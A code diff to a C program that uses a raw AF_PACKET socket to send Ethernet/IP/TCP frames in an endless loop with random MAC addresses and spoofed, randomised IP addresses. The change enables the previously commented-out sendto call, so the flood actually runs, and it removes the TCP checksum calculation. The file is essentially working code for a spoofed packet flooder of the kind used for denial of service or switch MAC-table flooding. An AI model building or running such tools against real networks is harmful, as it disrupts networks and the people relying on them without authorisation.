@@ -15,7 +15,7 @@
 
 #include "header.h"
 
-#define SRC_IP  "129.104.97.83" //set your source ip here. It can be a fake one
+#define SRC_IP  "192.168.0.13" //set your source ip here. It can be a fake one
 #define SRC_PORT 54321 //set the source port here. It can be a fake one
 #define DEST_IP "192.168.1.121" //set your destination ip here
 #define DEST_PORT 8081  //set the destination port here
@@ -77,10 +77,10 @@ void fill_iph(struct iphdr* iph){
 
 int main(){
     unsigned short proto =0x0800;
+	char street[5];
+	char src_ip[15];
     int fd = socket(AF_PACKET, SOCK_RAW,htons(proto));
 	srand(time(NULL));
-	char* src_ip=malloc(100);
-	strcpy(src_ip,SRC_IP);
     int hincl = 1;               
 
 	if(fd < 0)
@@ -103,7 +103,6 @@ int main(){
 	struct tcphdr *tcph = (struct tcphdr *)(iph + sizeof(struct iphdr));
 	
 
-	struct pseudo_udp_header psh; //pseudo header
 	
 
 	//data section pointer
@@ -114,35 +113,37 @@ int main(){
 	data_size=strlen(data);
 	fill_iph(iph);
 	fill_tcph(tcph);
+	
 
-    //fill pseudo header
-    psh.source_address=iph->saddr;
-	psh.dest_address=iph->daddr;
-	psh.placeholder=0;
-	psh.protocol=iph->protocol;
-	psh.udp_length=htons(tcph->doff);
-
-
-    int psize = sizeof(struct pseudo_udp_header) + sizeof(struct udphdr) + strlen(data);
-	void* pseudogram = malloc(psize);
-	memset(pseudogram,0,psize);
-    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_udp_header));
-	memcpy(pseudogram + sizeof(struct pseudo_udp_header) , tcph , sizeof(struct tcphdr) + strlen(data));
-	tcph->check = checksum((unsigned short *) pseudogram,psize);
-	free(pseudogram);
-
-    while(1){
-	memcpy(eth->h_dest,random_mac_adress(),6);
-    memcpy(eth->h_source,random_mac_adress(),6);
-    eth->h_proto=htons(proto);
     struct sockaddr_ll saddrll;
-    memset((void*)&saddrll, 0, sizeof(saddrll));
-    saddrll.sll_family = PF_PACKET;   
-    saddrll.sll_ifindex = 2;
-    saddrll.sll_halen = ETH_ALEN;
-    memcpy((void*)(saddrll.sll_addr), eth->h_dest, ETH_ALEN);
-    //sendto(fd,packet,ntohs(iph->tot_len)+sizeof(struct  ethhdr),0,&saddrll,sizeof(saddrll));
-	perror("");
+    while(1){
+		uint8_t* mac_addr=random_mac_adress();
+		memcpy(eth->h_dest,mac_addr,6);
+		free(mac_addr);
+		mac_addr=random_mac_adress();
+		memcpy(eth->h_source,mac_addr,6);
+		free(mac_addr);
+		eth->h_proto=htons(proto);
+		memset((void*)&saddrll, 0, sizeof(saddrll));
+		saddrll.sll_family = PF_PACKET;   
+		saddrll.sll_ifindex = 8;
+		saddrll.sll_halen = ETH_ALEN;
+		memcpy((void*)(saddrll.sll_addr), eth->h_dest, ETH_ALEN);
+
+		//for random ip's
+		strcpy(src_ip,"192.168.0.");
+		sprintf(street,"%d",rand()%255);
+		strcat(src_ip,street);
+		printf("%s\n",src_ip);
+		inet_pton(AF_INET,src_ip,&(iph->saddr));
+		strcpy(src_ip,"192.168.0.");
+		sprintf(street,"%d",rand()%255);
+		strcat(src_ip,street);
+		inet_pton(AF_INET,src_ip,&(iph->daddr));
+		
+
+		sendto(fd,packet,ntohs(iph->tot_len)+sizeof(struct  ethhdr),0,&saddrll,sizeof(saddrll));
+		perror("");
 	}
 	return 0;
 
